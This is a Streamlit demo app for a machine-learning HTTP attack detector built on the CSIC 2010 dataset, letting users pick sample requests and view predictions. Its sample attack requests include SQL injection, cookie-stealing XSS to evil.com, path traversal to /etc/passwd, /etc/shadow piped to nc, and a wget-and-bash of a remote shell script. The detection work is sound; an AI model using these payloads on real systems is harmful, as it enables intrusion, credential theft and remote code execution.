"""
app/streamlit_app.py
---------------------
Demo Streamlit cho hệ thống phát hiện tấn công HTTP.

Input : HTTP request (method, URL, body) nhập trực tiếp trên UI.
Output: Prediction (Normal / Malicious), Probability score, Attack indicators
        được phát hiện trong request.

Chạy:
    streamlit run app/streamlit_app.py

Yêu cầu: đã chạy `python scripts/train_models.py` trước đó để tạo ra
các file trong models/.
"""
import os
import sys

import streamlit as st

current_dir = os.path.dirname(os.path.abspath(__file__))
project_root = os.path.abspath(os.path.join(current_dir, ".."))
sys.path.append(project_root)

from app.inference import ModelBundle, predict


st.set_page_config(
    page_title="HTTP Attack Detection Demo",
    layout="wide",
)


@st.cache_resource
def load_bundle():
    return ModelBundle()


# ---- Sample requests để demo nhanh ----
# Lưu ý quan trọng: CSIC 2010 dataset mô phỏng 1 trang web thương mại điện tử
# tiếng Tây Ban Nha, mọi request (cả normal và attack) đều dùng path dạng
# /tienda1/... với các tham số như id, nombre, precio, cantidad, B1...
# Dùng path "lạ" (ví dụ /index.php, /login.php) sẽ KHÔNG khớp phân phối dữ
# liệu train -> model dễ coi nhầm là bất thường dù request hoàn toàn vô hại.
# Vì vậy các mẫu dưới đây bám theo đúng cấu trúc URL/tham số thật của CSIC.
SAMPLE_REQUESTS = {
    "-- Choose a sample request --": None,
    "Normal: Search for products": {
        "method": "GET",
        "url": "/tienda1/publico/productos.jsp?id=2&nombre=Jam%F3n+Lim%F3n&precio=39",
        "body": "",
    },
    "Normal: Add to cart": {
        "method": "POST",
        "url": "/tienda1/publico/anadir.jsp",
        "body": "id=3&nombre=Queso+Manchego&precio=85&cantidad=2&B1=A%F1adir+al+carrito",
    },
    "Normal: Valid login": {
        "method": "POST",
        "url": "/tienda1/publico/autenticar.jsp",
        "body": "modo=entrar&login=alvarez&pwd=hunter2&B1=Entrar",
    },
    "Attack: SQL Injection": {
        "method": "POST",
        "url": "/tienda1/publico/anadir.jsp",
        "body": "id=2&nombre=Jamon&precio=85&cantidad=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&B1=Anadir+al+carrito",
    },
    "Attack: XSS": {
        "method": "POST",
        "url": "/tienda1/publico/comentario.jsp",
        "body": "id=1&comentario=<script>alert(document.cookie)</script>&B1=Enviar",
    },
    "Attack: Path Traversal": {
        "method": "GET",
        "url": "/tienda1/publico/mostrar.jsp?fichero=../../../../etc/passwd",
        "body": "",
    },
    "Attack: Command Injection": {
        "method": "POST",
        "url": "/tienda1/publico/anadir.jsp",
        "body": "id=1; cat /etc/passwd&nombre=test&precio=10&B1=Anadir",
    },
    "Attack: SQLi + XSS": {
        "method": "POST",
        "url": "/tienda1/publico/anadir.jsp?id=1' UNION SELECT username,password FROM usuarios--",
        "body": "nombre=<script>alert(document.cookie)</script>&precio=' OR '1'='1&cantidad=1&B1=Anadir",
    },
    "Attack: Path Traversal + Command Injection": {
        "method": "GET",
        "url": "/tienda1/publico/mostrar.jsp?fichero=../../../../etc/passwd;cat /etc/shadow|nc 10.0.0.1 4444",
        "body": "",
    },
    "Attack: SQLi + XSS + CMD + Traversal": {
        "method": "POST",
        "url": "/tienda1/publico/anadir.jsp?id=1' UNION SELECT * FROM usuarios--&fichero=../../../etc/passwd",
        "body": "nombre=<script>document.location='http://evil.com/'+document.cookie</script>&"
                "precio=1; wget http://evil.com/shell.sh -O /tmp/x; bash /tmp/x&"
                "cantidad=' OR sleep(5)='&B1=Anadir",
    },
}


def main():
    st.title("HTTP Attack Detection — Demo")
    st.caption(
        "Enter an HTTP request, the system will analyze and predict "
        "whether it is **Normal** or **Malicious**"
    )

    try:
        bundle = load_bundle()
    except FileNotFoundError as e:
        st.error(str(e))
        st.info(
            "Chạy lệnh sau ở terminal trước khi dùng demo:\n\n"
            "```bash\npython scripts/train_models.py\n```"
        )
        st.stop()

    # ---- Sidebar: chọn model + metrics ----
    with st.sidebar:
        st.header("Configuration")
        model_name = st.selectbox(
            "Select model",
            options=bundle.available_models,
            help="Random Forest and XGBoost are trained on the same "
                 "hybrid features (handcrafted + TF-IDF) in scripts/train_models.py",
        )

        if bundle.metrics:
            key = "random_forest" if model_name == "Random Forest" else "xgboost"
            m = bundle.metrics.get(key)
            if m:
                st.subheader("Performance on test set")
                st.metric("Accuracy", f"{m['Accuracy']:.4f}")
                st.metric("F1-Score", f"{m['F1']:.4f}")
                st.metric("ROC-AUC", f"{m['ROC-AUC']:.4f}" if m["ROC-AUC"] else "N/A")
                col_a, col_b = st.columns(2)
                with col_a:
                    st.metric("Precision", f"{m['Precision']:.4f}")
                with col_b:
                    st.metric("Recall", f"{m['Recall']:.4f}")

        st.markdown("---")
        st.caption(
            "Pipeline: `src/preprocessing.py` → `src/features.py` "
            "(hybrid mode) → model (`src/models.py`)."
        )

    # ---- Sample picker ----
    sample_key = st.selectbox("Or select a sample request", list(SAMPLE_REQUESTS.keys()))
    sample = SAMPLE_REQUESTS.get(sample_key)

    # ---- Form input ----
    col1, col2 = st.columns([1, 3])
    with col1:
        method = st.selectbox(
            "Method",
            options=["GET", "POST", "PUT", "DELETE"],
            index=["GET", "POST", "PUT", "DELETE"].index(sample["method"]) if sample else 0,
        )
    with col2:
        url = st.text_input(
            "URL (path + query string)",
            value=sample["url"] if sample else "",
            placeholder="/product.php?id=1",
        )

    body = st.text_area(
        "Body (if any, e.g., POST form-data)",
        value=sample["body"] if sample else "",
        placeholder="username=admin&password=123456",
        height=100,
    )

    analyze_clicked = st.button("Analyze Request", type="primary", use_container_width=True)

    if analyze_clicked:
        if not url.strip():
            st.warning("Please enter a URL")
            st.stop()

        with st.spinner("Analyzing..."):
            result = predict(bundle, model_name, method, url, body)

        st.markdown("---")
        st.subheader("Results")

        res_col1, res_col2, res_col3 = st.columns(3)

        with res_col1:
            if result["prediction"] == "Malicious":
                st.error(f"**{result['prediction']}**")
            else:
                st.success(f"**{result['prediction']}**")

        with res_col2:
            if result["probability"] is not None:
                st.metric("Probability (Malicious)", f"{result['probability']*100:.2f}%")
                st.progress(min(max(result["probability"], 0.0), 1.0))
            else:
                st.metric("Probability", "N/A")

        with res_col3:
            st.metric("Model used", model_name)
            st.metric("Feature count", result["feature_count"])

        st.markdown("---")
        st.subheader("Detected Attack Indicators")
        indicators = result["attack_indicators"]
        if indicators:
            for group, hits in indicators.items():
                st.markdown(f"**{group}**")
                st.code(", ".join(hits), language="text")
        else:
            st.info("No specific attack indicators detected in this request")

        with st.expander("Debug details (normalized text via preprocessing)"):
            st.code(result["full_text"] or "(rỗng)", language="text")


if __name__ == "__main__":
    main()